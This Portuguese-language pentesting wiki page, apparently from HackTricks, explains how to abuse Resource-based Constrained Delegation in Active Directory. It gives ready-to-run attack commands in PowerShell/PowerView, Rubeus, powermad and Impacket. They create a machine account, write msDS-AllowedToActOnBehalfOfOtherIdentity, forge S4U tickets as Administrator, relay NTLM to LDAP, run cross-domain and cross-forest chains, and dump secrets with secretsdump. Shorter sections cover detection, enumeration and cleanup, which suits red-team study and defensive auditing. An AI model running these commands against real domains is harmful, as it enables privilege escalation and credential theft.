# Resource-based Constrained Delegation

{{#include ../../banners/hacktricks-training.md}}


## Noções básicas de Resource-based Constrained Delegation

Isso é semelhante à [Constrained Delegation](constrained-delegation.md) básica, mas **em vez** de conceder permissões a um **objeto** para **personificar qualquer usuário contra uma máquina**, a Resource-based Constrain Delegation **define**, **no objeto**, quem pode personificar qualquer usuário contra ele.<sup>[[12]](#references)</sup>

Nesse caso, o objeto restrito terá um atributo chamado _**msDS-AllowedToActOnBehalfOfOtherIdentity**_ com o nome do usuário que pode personificar qualquer outro usuário contra ele.

Outra diferença importante entre esta Constrained Delegation e as outras delegações é que qualquer usuário com **permissões de escrita sobre uma conta de máquina** (_GenericAll/GenericWrite/WriteDacl/WriteProperty/etc_) pode definir o **_msDS-AllowedToActOnBehalfOfOtherIdentity_** (nas outras formas de Delegation, eram necessários privilégios de domain admin).<sup>[[1]](#references)</sup>

### Novos conceitos

Na Constrained Delegation, foi dito que a flag **`TrustedToAuthForDelegation`** dentro do valor _userAccountControl_ do usuário é necessária para executar um **S4U2Self.** Mas isso não é completamente verdade.\
A realidade é que, mesmo sem esse valor, você pode executar um **S4U2Self** contra qualquer usuário se for um **service** (tiver um SPN), mas, se você **tiver `TrustedToAuthForDelegation`**, o TGS retornado será **Forwardable** e, se você **não tiver** essa flag, o TGS retornado **não será** **Forwardable**.<sup>[[5]](#references)</sup>

No entanto, se o **TGS** usado em **S4U2Proxy** **não for Forwardable**, tentar abusar de uma **basic Constrain Delegation** **não funcionará**. Mas, se você estiver tentando explorar uma **Resource-Based constrain delegation, funcionará**.<sup>[[1]](#references)[[2]](#references)</sup>

### Estrutura do ataque

> Se você tiver **privilégios equivalentes de escrita** sobre uma conta de **Computer**, poderá obter **acesso privilegiado** nessa máquina.

Suponha que o atacante já tenha **privilégios equivalentes de escrita sobre o computador vítima**.

1. O atacante **compromete** uma conta que tenha um **SPN** ou **cria uma** (“Service A”). Observe que qualquer _Admin User_ sem nenhum outro privilégio especial pode **criar até 10 objetos Computer** (**_MachineAccountQuota_**) e definir um **SPN** neles. Portanto, o atacante pode simplesmente criar um objeto Computer e definir um SPN.
2. O atacante **abusa do seu privilégio WRITE** sobre o computador vítima (ServiceB) para configurar a resource-based constrained delegation, permitindo que ServiceA personifique qualquer usuário contra esse computador vítima (ServiceB).
3. O atacante usa o Rubeus para executar um **ataque S4U completo** (S4U2Self e S4U2Proxy) de Service A para Service B, em nome de um usuário **com acesso privilegiado ao Service B**.
1. S4U2Self (a partir da conta comprometida/criada com SPN): Solicita um **TGS de Administrator para mim** (Not Forwardable).
2. S4U2Proxy: Usa o **TGS não Forwardable** da etapa anterior para solicitar um **TGS** de **Administrator** para o **host vítima**.
3. Mesmo usando um TGS não Forwardable, como você está explorando uma Resource-based constrained delegation, isso funcionará.
4. O atacante pode executar **pass-the-ticket** e **personificar** o usuário para obter **acesso ao ServiceB vítima**.<sup>[[1]](#references)</sup>

Para verificar o _**MachineAccountQuota**_ do domínio, você pode usar:
```bash
Get-DomainObject -Identity "dc=domain,dc=local" -Domain domain.local | select MachineAccountQuota
```
## Ataque

### Criando um objeto de computador

Você pode criar um objeto de computador dentro do domínio usando **[powermad](https://github.com/Kevin-Robertson/Powermad):**<sup>[[3]](#references)[[4]](#references)</sup>
```bash
import-module powermad
New-MachineAccount -MachineAccount SERVICEA -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose

# Check if created
Get-DomainComputer SERVICEA
```
### Configurando Resource-based Constrained Delegation

**Usando o módulo activedirectory do PowerShell**<sup>[[4]](#references)</sup>.
```bash
Set-ADComputer $targetComputer -PrincipalsAllowedToDelegateToAccount SERVICEA$ #Assing delegation privileges
Get-ADComputer $targetComputer -Properties PrincipalsAllowedToDelegateToAccount #Check that it worked
```
**Usando powerview**<sup>[[3]](#references)</sup>
```bash
$ComputerSid = Get-DomainComputer FAKECOMPUTER -Properties objectsid | Select -Expand objectsid
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$ComputerSid)"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)
Get-DomainComputer $targetComputer | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}

#Check that it worked
Get-DomainComputer $targetComputer -Properties 'msds-allowedtoactonbehalfofotheridentity'

msds-allowedtoactonbehalfofotheridentity
----------------------------------------
{1, 0, 4, 128...}
```
### Realizando um ataque S4U completo (Windows/Rubeus)

Primeiro, criamos o novo objeto Computer com a senha `123456`, então precisamos do hash dessa senha:<sup>[[3]](#references)[[4]](#references)</sup>
```bash
.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local
```
Isso imprimirá os hashes RC4 e AES dessa conta.\
Agora, o ataque pode ser realizado:<sup>[[3]](#references)[[4]](#references)</sup>
```bash
rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<aes256 hash> /aes128:<aes128 hash> /rc4:<rc4 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /domain:domain.local /ptt
```
Você pode gerar mais tickets para mais serviços fazendo apenas uma solicitação usando o parâmetro `/altservice` do Rubeus:
```bash
rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<AES 256 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /altservice:krbtgt,cifs,host,http,winrm,RPCSS,wsman,ldap /domain:domain.local /ptt
```
> [!CAUTION]
> Observe que os usuários têm um atributo chamado "**Cannot be delegated**". Se um usuário tiver esse atributo definido como True, você não poderá personificá-lo. Essa propriedade pode ser vista no bloodhound.

### Ferramentas para Linux: RBCD de ponta a ponta com Impacket (2024+)

Se você operar a partir do Linux, poderá executar a cadeia completa de RBCD usando as ferramentas oficiais do Impacket:<sup>[[6]](#references)[[7]](#references)</sup>
```bash
# 1) Create attacker-controlled machine account (respects MachineAccountQuota)
impacket-addcomputer -computer-name 'FAKE01$' -computer-pass 'P@ss123' -dc-ip 192.168.56.10 'domain.local/jdoe:Summer2025!'

# 2) Grant RBCD on the target computer to FAKE01$
#    -action write appends/sets the security descriptor for msDS-AllowedToActOnBehalfOfOtherIdentity
impacket-rbcd -delegate-to 'VICTIM$' -delegate-from 'FAKE01$' -dc-ip 192.168.56.10 -action write 'domain.local/jdoe:Summer2025!'

# 3) Request an impersonation ticket (S4U2Self+S4U2Proxy) for a privileged user against the victim service
impacket-getST -spn cifs/victim.domain.local -impersonate Administrator -dc-ip 192.168.56.10 'domain.local/FAKE01$:P@ss123'

# 4) Use the ticket (ccache) against the target service
export KRB5CCNAME=$(pwd)/Administrator.ccache
# Example: dump local secrets via Kerberos (no NTLM)
impacket-secretsdump -k -no-pass Administrator@victim.domain.local
```
Notas
- Se a assinatura LDAP/LDAPS for obrigatória, use `impacket-rbcd -use-ldaps ...`.
- Prefira chaves AES; muitos domínios modernos restringem RC4. Tanto o Impacket quanto o Rubeus são compatíveis com fluxos que usam apenas AES.
- O Impacket pode reescrever o `sname` ("AnySPN") em algumas ferramentas, mas obtenha o SPN correto sempre que possível (por exemplo, CIFS/LDAP/HTTP/HOST/MSSQLSvc).

## RBCD entre domínios e florestas

Se a **entidade delegadora** que você controla estiver em um **domínio diferente** (ou até mesmo em uma **floresta diferente**) do computador de recurso, o abuso ainda será **RBCD**, mas o fluxo do ticket não será mais o usual `S4U2Self -> S4U2Proxy` de um único domínio.

### RBCD entre domínios: configurar a entidade estrangeira por SID

Quando você define `msDS-AllowedToActOnBehalfOfOtherIdentity` a partir de um **domínio diferente**, a máquina/usuário estrangeiro pode **não ser resolvível por nome** no LDAP do domínio de destino. Nesse caso, configure a entrada de delegação usando o **SID** da entidade estrangeira em vez de seu sAMAccountName/UPN.

Isso é especialmente relevante ao retransmitir NTLM para LDAP com `ntlmrelayx.py`:<sup>[[9]](#references)</sup>
```bash
sudo ntlmrelayx.py -smb2support -t ldap://192.168.90.217 \
--no-dump --no-da --no-validate-privs \
--delegate-access \
--escalate-user S-1-5-21-3104832133-133926542-3798009529-1106 \
--sid
```
Notas:
- `--sid` instrui `ntlmrelayx.py` a tratar `--escalate-user` como um SID, o que é necessário quando a conta de delegação é estrangeira ao domínio de destino.
- Mesmo que a ferramenta exiba `User not found in LDAP`, a gravação da delegação ainda pode ser bem-sucedida, pois o security descriptor armazena diretamente o SID estrangeiro.

### RBCD entre domínios: sequência S4U entre realms

Quando o principal estrangeiro está em `msDS-AllowedToActOnBehalfOfOtherIdentity`, o fluxo funcional entre domínios é:<sup>[[9]](#references)[[13]](#references)</sup>

1. Obter um **TGT** para o principal de delegação no próprio domínio.
2. Solicitar um **referral TGT** para `krbtgt/<target-domain>`.
3. Solicitar um **cross-realm S4U2Self referral** para o usuário impersonado no DC do domínio de destino.
4. Solicitar o ticket **S4U2Self** efetivo para esse usuário novamente no domínio do delegador.
5. Executar **S4U2Proxy** no domínio do delegador para obter um referral ticket para o domínio de destino.
6. Executar o **S4U2Proxy** final no DC do domínio de destino para obter o service ticket para `cifs/host.target`, `host/host.target`, etc.

É por isso que as ferramentas Linux padrão frequentemente falham com RBCD entre domínios:<sup>[[9]](#references)</sup>
- o **realm** da solicitação pode precisar ser diferente do realm do TGT usado no `TGS-REQ`
- a cadeia precisa de etapas **S4U2Proxy independentes**, e não apenas de **S4U2Self** ou de **S4U2Self** imediatamente seguido por um único **S4U2Proxy**

### RBCD entre domínios a partir do Linux

A Synacktiv publicou uma implementação de `getST.py` do Impacket que reproduz a sequência entre realms a partir do Linux, tratando explicitamente os dois KDCs:<sup>[[9]](#references)[[11]](#references)</sup>
```bash
python3 ./getST.py dev.asgard.local/rbcd_test\$:R[...]5 -k \
-dc-ip 192.168.90.131 \
-targetdc 192.168.90.217 \
-targetdomain asgard.local \
-impersonate thor_adm \
-spn cifs/workstation.asgard.local

KRB5CCNAME=thor_adm@cifs_workstation.asgard.local@ASGARD.LOCAL.ccache \
./smbclient.py "asgard.local/thor_adm@workstation.asgard.local" \
-k -no-pass -dc-ip 192.168.90.217
```
Operacionalmente, os novos argumentos são:
- `-dc-ip`: DC do domínio **delegating**
- `-targetdomain`: domínio do **resource computer**
- `-targetdc`: DC do domínio de **resource**

### Limitações do RBCD cross-forest

O RBCD cross-forest tem uma limitação importante: **o usuário impersonado deve pertencer à mesma forest que o principal delegating**. Em outras palavras, se sua machine account controlada estiver em `valhalla.local` e o recurso alvo estiver em `asgard.local`, em geral você **não poderá impersonar usuários arbitrários de `asgard.local`** nesse recurso via RBCD.<sup>[[9]](#references)</sup>

Ele ainda pode ser explorado quando:
- o usuário da **delegating forest** é um **local admin** (ou possui outros privilégios) no host do recurso na outra forest
- uma trust permite o caminho de autenticação necessário e o SID estrangeiro é aceito no security descriptor do computador alvo

### Particularidades do protocolo RBCD cross-forest

O RBCD cross-forest não é apenas "cross-domain com uma trust". O fluxo observado inclui duas particularidades que ferramentas comuns historicamente não tratam:<sup>[[9]](#references)</sup>

1. Uma solicitação **S4U2Proxy** adicional que define `PA-PAC-OPTIONS=branch-aware`
2. Um service ticket final que pode ser retornado usando **RC4**, mesmo quando outros etypes foram solicitados

O fluxo prático é:

1. Obtenha um TGT para o principal delegating na forest A.
2. Solicite **S4U2Self** para o usuário impersonado na forest A.
3. Solicite **S4U2Proxy** na forest A para obter um referral TGT para a forest B.
4. Envie um segundo **S4U2Proxy** na forest A **sem o ticket S4U2Self como additional ticket**, mas com `branch-aware` habilitado, para obter outro referral TGT para a forest B.
5. Opcionalmente, solicite um service ticket normal na forest B para o principal delegating (esse ticket não é necessário para o abuso final).
6. Use os referral tickets das etapas 3 e 4 para solicitar o ticket **S4U2Proxy** final na forest B, para o usuário da forest A impersonado, destinado ao SPN alvo.

### RBCD cross-forest a partir do Linux

A mesma branch do Synacktiv Impacket adiciona um switch `-forest` para essa lógica:<sup>[[9]](#references)[[11]](#references)</sup>
```bash
python3 ./getST.py -spn 'cifs/workstation.asgard.local' \
-impersonate 'v_thor' \
-dc-ip VALHALLA.local \
valhalla.local/'desktop$' \
-targetdc ASGARD.local \
-targetdomain asgard.local \
-aesKey 4[...]f \
-forest
```
### RBCD recursivo em múltiplos domínios (3+ domínios)

Em **florestas com múltiplos domínios**, tanto **S4U2Self** quanto **S4U2Proxy** podem ser **recursivos**, em vez de parar após uma única referência:

- **S4U2Self recursivo**: o primeiro `S4U2Self` é enviado ao **domínio do usuário personificado**, os saltos intermediários entre domínios pai/filho são percorridos com referências normais de `TGS-REQ` para `krbtgt/<REALM>`, e o **`S4U2Self` final** é enviado no **próprio domínio do principal delegador**.
- Isso significa que **ter apenas um TGT** de uma conta de máquina pode ser suficiente para personificar um **administrador de outro domínio na mesma floresta** e solicitar `cifs/host`, `host/host`, `wsman/host`, etc.
- O **S4U2Proxy recursivo** segue a cadeia de confiança da mesma forma: os saltos intermediários reutilizam o ticket anterior como TGT enquanto solicitam a próxima referência de `krbtgt/<REALM>`, e somente o último salto retorna o ticket de serviço final.<sup>[[10]](#references)</sup>

Um exemplo prático na mesma floresta é:
```bash
KRB5CCNAME=MIN-FRPERSO-01\$.ccache getST.py 'minus.sub.frperso.local/MIN-FRPERSO-01$' -k -no-pass \
-impersonate Administrator@frperso.local -self \
-altservice cifs/min-frperso-01.minus.sub.frperso.local

KRB5CCNAME=Administrator@frperso.local@cifs_min-frperso-01.minus.sub.frperso.local@MINUS.SUB.FRPERSO.LOCAL.ccache \
smbclient.py frperso.local/Administrator@min-frperso-01.minus.sub.frperso.local -k -no-pass
```
### RBCD cross-domain / cross-forest sem SPN

Se o **delegating principal for um usuário sem um SPN**, o último `S4U2Self` recursivo falhará com **`KDC_ERR_S_PRINCIPAL_UNKNOWN`**. A solução alternativa é **tentar novamente apenas o salto final como `S4U2Self+U2U`**.<sup>[[10]](#references)</sup>

Versão resumida da cadeia de abuso:

1. Autentique-se com o **NT hash** para induzir o KDC a usar **RC4-HMAC (etype 23)**.
2. Solicite `-self -u2u` primeiro e mantenha esse ticket separado da etapa de proxy posterior.
3. Extraia a chave de sessão do **TGT** com `describeTicket.py`.
4. Substitua o **NT hash** do usuário por essa **chave de sessão** usando `changepasswd.py -newhashes <session_key>`.
5. Reutilize o ticket `S4U2Self+U2U` como **`-additional-ticket`** durante uma solicitação `-proxy` separada.
```bash
getST.py sub.frperso.local/Administrator -hashes ':<nthash>' \
-impersonate Administrator@frperso.local -self -u2u
describeTicket.py Administrator.ccache
changepasswd.py sub.frperso.local/Administrator@sub-frperso-01.sub.frperso.local \
-hashes ':<nthash>' -newhashes <tgt_session_key>
KRB5CCNAME=Administrator.ccache getST.py sub.frperso.local/Administrator -k -no-pass \
-impersonate Administrator@frperso.local -proxy -proxydomain frpublic.local \
-spn cifs/frpublic-01.frpublic.local -additional-ticket '<u2u_ticket.ccache>'
```
Ressalvas operacionais:

- Quando o **primeiro trusted hop já é outra forest**, prefira o algoritmo **branch-aware** (`getST.py ... -forest`) para corresponder ao comportamento nativo do Windows. Se a foreign forest só for alcançada **mais tarde** na cadeia, o fluxo recursivo non-branch-aware ainda poderá funcionar.<sup>[[9]](#references)</sup>
- Em DCs recentes do **Windows Server 2022/2025**, forçar RC4 pode falhar com **`KDC_ERR_ETYPE_NOSUPP`** devido à descontinuação do RC4; isso pode tornar o **SPN-less RBCD impossível**, mesmo que o RBCD clássico baseado em SPN ainda funcione com AES.<sup>[[15]](#references)</sup>
- Execute **`S4U2Self+U2U` antes de alterar o hash/senha do usuário**: `SamrChangePasswordUser` **não** recalcula as chaves AES Kerberos da conta, portanto alterar a senha primeiro pode interromper solicitações posteriores de tickets.<sup>[[14]](#references)</sup>
- A conta impersonated ainda deve ser **delegable**: **Protected Users** e contas com **`NOT_DELEGATED`** / **"Account is sensitive and cannot be delegated"** bloqueiam a cadeia.

## Observações de detecção / hardening

- Os caminhos de RBCD entre domínios/forests ainda costumam ser criados por meio de **abuso de ACL** ou **relay-to-LDAP**. Aplique **LDAP signing** e **LDAP channel binding** nos DCs para interromper os caminhos comuns de configuração.
- Audite quem pode gravar `msDS-AllowedToActOnBehalfOfOtherIdentity` em objetos de computador e resolva os SIDs armazenados, incluindo **foreign security principals**.
- Em ambientes com muitos trusts, revise **Selective Authentication**, **SID filtering** e se usuários de uma foreign forest possuem privilégios de **local admin** nos hosts de recursos.

### Acesso

A última linha de comando executará o **ataque S4U completo e injetará o TGS** do Administrator no host vítima, **em memória**.\
Neste exemplo, foi solicitado um TGS para o serviço **CIFS** do Administrator, portanto você poderá acessar **C$**:
```bash
ls \\victim.domain.local\C$
```
### Abusar de diferentes service tickets

Saiba mais sobre os [**service tickets disponíveis aqui**](silver-ticket.md#available-services).

## Enumeração, auditoria e limpeza

### Enumerar computadores com RBCD configurado

PowerShell (decodificando o SD para resolver os SIDs):
```powershell
# List all computers with msDS-AllowedToActOnBehalfOfOtherIdentity set and resolve principals
Import-Module ActiveDirectory
Get-ADComputer -Filter * -Properties msDS-AllowedToActOnBehalfOfOtherIdentity |
Where-Object { $_."msDS-AllowedToActOnBehalfOfOtherIdentity" } |
ForEach-Object {
$raw = $_."msDS-AllowedToActOnBehalfOfOtherIdentity"
$sd  = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $raw, 0
$sd.DiscretionaryAcl | ForEach-Object {
$sid  = $_.SecurityIdentifier
try { $name = $sid.Translate([System.Security.Principal.NTAccount]) } catch { $name = $sid.Value }
[PSCustomObject]@{ Computer=$_.ObjectDN; Principal=$name; SID=$sid.Value; Rights=$_.AccessMask }
}
}
```
Impacket (ler ou limpar com um comando):
```bash
# Read who can delegate to VICTIM
impacket-rbcd -delegate-to 'VICTIM$' -action read 'domain.local/jdoe:Summer2025!'
```
### Limpeza / redefinição do RBCD

- PowerShell (limpar o atributo):
```powershell
Set-ADComputer $targetComputer -Clear 'msDS-AllowedToActOnBehalfOfOtherIdentity'
# Or using the friendly property
Set-ADComputer $targetComputer -PrincipalsAllowedToDelegateToAccount $null
```
- Impacket:
```bash
# Remove a specific principal from the SD
impacket-rbcd -delegate-to 'VICTIM$' -delegate-from 'FAKE01$' -action remove 'domain.local/jdoe:Summer2025!'
# Or flush the whole list
impacket-rbcd -delegate-to 'VICTIM$' -action flush 'domain.local/jdoe:Summer2025!'
```
## Erros do Kerberos

- **`KDC_ERR_ETYPE_NOTSUPP`**: Isso significa que o kerberos está configurado para não usar DES ou RC4 e você está fornecendo apenas o hash RC4. Forneça ao Rubeus pelo menos o hash AES256 (ou forneça os hashes rc4, aes128 e aes256). Exemplo: `[Rubeus.Program]::MainString("s4u /user:FAKECOMPUTER /aes256:CC648CF0F809EE1AA25C52E963AC0487E87AC32B1F71ACC5304C73BF566268DA /aes128:5FC3D06ED6E8EA2C9BB9CC301EA37AD4 /rc4:EF266C6B963C0BB683941032008AD47F /impersonateuser:Administrator /msdsspn:CIFS/M3DC.M3C.LOCAL /ptt".split())`
- **`KDC_ERR_S_PRINCIPAL_UNKNOWN`** durante `-self` para um usuário normal: o principal delegador provavelmente **não possui SPN**. Tente novamente o **último hop** como **`S4U2Self+U2U`**, em vez de um `S4U2Self` normal.<sup>[[10]](#references)</sup>
- **`KDC_ERR_ETYPE_NOSUPP`** durante **SPN-less RBCD**: DCs recentes podem rejeitar o caminho **RC4-HMAC** forçado exigido pelo truque **`S4U2Self+U2U` + substituição da chave de sessão**. Tente, em vez disso, um caminho clássico de **RBCD baseado em SPN** com AES.<sup>[[10]](#references)[[15]](#references)</sup>
- **`KRB_AP_ERR_SKEW`**: Isso significa que o horário do computador atual é diferente do horário do DC e o kerberos não está funcionando corretamente.
- **`preauth_failed`**: Isso significa que o nome de usuário + hashes fornecidos não estão funcionando para fazer login. Talvez você tenha esquecido de colocar o "$" dentro do nome de usuário ao gerar os hashes (`.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local`)
- **`KDC_ERR_BADOPTION`**: Isso pode significar:
- O usuário que você está tentando personificar não pode acessar o serviço desejado (porque você não pode personificá-lo ou porque ele não possui privilégios suficientes)
- O serviço solicitado não existe (se você solicitar um ticket para winrm, mas o winrm não estiver em execução)
- O fakecomputer criado perdeu seus privilégios sobre o servidor vulnerável e você precisa concedê-los novamente.
- Você está abusando do KCD clássico; lembre-se de que o RBCD funciona com tickets S4U2Self não encaminháveis, enquanto o KCD exige tickets encaminháveis.

## Observações, relays e alternativas

- Você também pode gravar o RBCD SD pelo AD Web Services (ADWS) se o LDAP estiver filtrado. Veja:


{{#ref}}
adws-enumeration.md
{{#endref}}

- As cadeias de relay do Kerberos frequentemente terminam em RBCD para obter local SYSTEM em uma única etapa. Veja exemplos práticos de ponta a ponta:


{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

- Se a assinatura LDAP/o channel binding estiverem **desabilitados** e você puder criar uma conta de máquina, ferramentas como o **KrbRelayUp** poderão fazer relay de uma autenticação Kerberos induzida para o LDAP, definir `msDS-AllowedToActOnBehalfOfOtherIdentity` para a conta de máquina no objeto do computador-alvo e personificar imediatamente o **Administrator** via S4U a partir de outro host.<sup>[[8]](#references)</sup>

## Referências

- [1] [Wagging the Dog: Abusing Resource-Based Constrained Delegation to Attack Active Directory](https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html)
- [2] [Another Word on Delegation](https://www.harmj0y.net/blog/redteaming/another-word-on-delegation/)
- [3] [Kerberos Resource-based Constrained Delegation: Computer Object Takeover](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution#modifying-target-computers-ad-object)
- [4] [Resource-Based Constrained Delegation Abuse](https://stealthbits.com/blog/resource-based-constrained-delegation-abuse/)
- [5] [Kerberosity Killed the Domain: An Offensive Kerberos Overview](https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61)
- [6] [Impacket rbcd.py (official)](https://github.com/fortra/impacket/blob/master/examples/rbcd.py)
- [7] [Quick Linux cheatsheet with recent syntax](https://tldrbins.github.io/rbcd/)
- [8] [0xdf – HTB Bruno (LDAP signing off → Kerberos relay to RBCD)](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)
- [9] [Synacktiv - Exploring cross-domain & cross-forest RBCD](https://www.synacktiv.com/en/publications/exploring-cross-domain-cross-forest-rbcd.html)
- [10] [Synacktiv - Exploring cross-domain & cross-forest RBCD: part 2](https://www.synacktiv.com/en/publications/exploring-cross-domain-cross-forest-rbcd-part-2.html)
- [11] [Synacktiv Impacket branch - cross_forest_rbcd](https://github.com/synacktiv/impacket/tree/cross_forest_rbcd)
- [12] [Microsoft Learn - Kerberos constrained delegation overview](https://learn.microsoft.com/en-us/windows-server/security/kerberos/kerberos-constrained-delegation-overview)
- [13] [Microsoft Open Specifications - Cross-domain S4U2Self](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-sfu/f35b6902-6f5e-4cd0-be64-c50bbaaf54a5)
- [14] [Microsoft Open Specifications - SamrChangePasswordUser](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-samr/9699d8ca-e1a4-433c-a8c3-d7bebeb01476)
- [15] [Microsoft Learn - Detect and remediate RC4 usage in Kerberos](https://learn.microsoft.com/en-us/windows-server/security/kerberos/detect-remediate-rc4-kerberos)


{{#include ../../banners/hacktricks-training.md}}
